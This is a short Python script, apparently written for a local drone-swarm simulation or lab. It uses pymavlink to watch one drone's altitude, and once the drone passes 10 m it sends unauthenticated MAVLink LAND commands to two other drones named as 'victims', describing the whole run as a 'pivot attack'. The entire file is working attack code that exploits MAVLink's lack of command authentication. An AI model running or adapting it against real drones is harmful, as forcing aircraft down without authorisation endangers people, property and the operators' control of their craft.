import time
from pymavlink import mavutil

# Adjust if your scan showed different ports
TEL_DRONE2 = 14541
CMD_PORTS = {1: 14580, 2: 14581, 3: 14582}

trigger_alt_m = 10.0
pivot_from = 2
victims = [1, 3]

tel = mavutil.mavlink_connection(f"udp:127.0.0.1:{TEL_DRONE2}")
tel.wait_heartbeat()
print("✅ Monitoring drone2 for trigger...")

def send_land(sysid):
    port = CMD_PORTS[sysid]
    cmd = mavutil.mavlink_connection(f"udpout:127.0.0.1:{port}")
    cmd.mav.command_long_send(
        sysid, 1,
        mavutil.mavlink.MAV_CMD_NAV_LAND,
        0, 0,0,0,0,0,0,0
    )
    print(f"🚨 Pivot: sent LAND to sysid={sysid} via {port}")

while True:
    msg = tel.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=1)
    if not msg:
        continue
    alt_m = msg.relative_alt / 1000.0
    if alt_m > trigger_alt_m:
        print(f"🔥 Trigger met on drone{pivot_from} (alt={alt_m:.1f}m). Pivoting to victims...")
        for v in victims:
            send_land(v)
        break

print("✅ Pivot attack complete.")
time.sleep(0.5)
